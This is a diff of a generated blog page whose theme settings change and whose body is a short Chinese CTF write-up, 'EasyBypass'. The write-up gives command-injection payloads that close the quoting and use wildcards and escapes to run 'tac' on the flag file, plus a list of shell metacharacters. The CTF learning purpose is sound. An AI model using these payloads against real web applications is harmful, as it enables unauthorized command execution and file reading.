@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -172,7 +165,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/0087.jpg') no-repeat center center;
+         style="background: url('https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152231002.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      7
+      3
        分钟
     </span>
   
@@ -245,19 +238,25 @@
             <!-- SEO header -->
             <h1 style="display: none">EasyBypass</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id="………"><a href="#………" class="headerlink" title="………"></a>………</h2><p>代码审计     </p>
 <p><img src="https://ae04.alicdn.com/kf/U81afd0c96ea04194babb7ddac8d9d8acR.jpg" srcset="/img/loading.gif" alt="01.png">     </p>
 <p>应该注意到comm1中没有过滤<code>tac</code>     </p>
 <p>flag被过，可以用通配符<code>f???</code>      </p>
 <p>一开始觉得用<code>;</code>把file毙了就行了，但我忽略了     </p>
-<pre><code>$comm1 = &#39;&quot;&#39; . $comm1 . &#39;&quot;&#39;;
-$comm2 = &#39;&quot;&#39; . $comm2 . &#39;&quot;&#39;;</code></pre>
+<div class="hljs"><pre><code>$comm1 = &#39;&quot;&#39; . $comm1 . &#39;&quot;&#39;;
+$comm2 = &#39;&quot;&#39; . $comm2 . &#39;&quot;&#39;;</code></pre></div>
 <p>还应该闭合双引号         </p>
 <p>payload：<code>?comm1=&quot;;tac /f???;&quot;</code><br>payload：<code>?comm1=&quot;;tac /fl\ag;&quot;</code><br>之前遇到过这个，两个<code>\\</code>过滤不了<code>\</code>，因为要经过PHP和正则两层解析，最后匹配的是个<code>|</code><br><img src="https://ae04.alicdn.com/kf/U20fbfe11e83c4e30a3043885763b63b9L.jpg" srcset="/img/loading.gif" alt="02.png"><br>file闭合，命令执行           </p>
 <p>这样一道题在本地试了半天，太菜了        </p>
 <p>###Linux通配符     </p>
-<pre><code>|     #管道符，或者（正则）   #命令1 | 命令2，命令1的结果传递给命令2
+<div class="hljs"><pre><code>|     #管道符，或者（正则）   #命令1 | 命令2，命令1的结果传递给命令2
 &gt;     #输出重定向   #清空原文内容，然后向文件里追加内容
 &gt;&gt;    #输出追加重定向   #追加到文件最后一行
 &lt;     #输入重定向
@@ -274,7 +273,7 @@ $     #以。。。结尾（正则）
 []      #表示一个范围（正则，通配符）
 &#123;&#125;      #产生一个序列（通配符）
 .       #当前目录的硬链接
-..      #上级目录的硬链接</code></pre>
+..      #上级目录的硬链接</code></pre></div>
 <p><img src="https://ae03.alicdn.com/kf/U7a5bcd1aa2484b7d9ee175e7b557cd0dt.jpg" srcset="/img/loading.gif" alt="03.png"></p>
 
             </div>
@@ -394,7 +393,7 @@ $     #以。。。结尾（正则）
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -420,8 +419,6 @@ $     #以。。。结尾（正则）
 
 
 
-  
-    
   
 
 
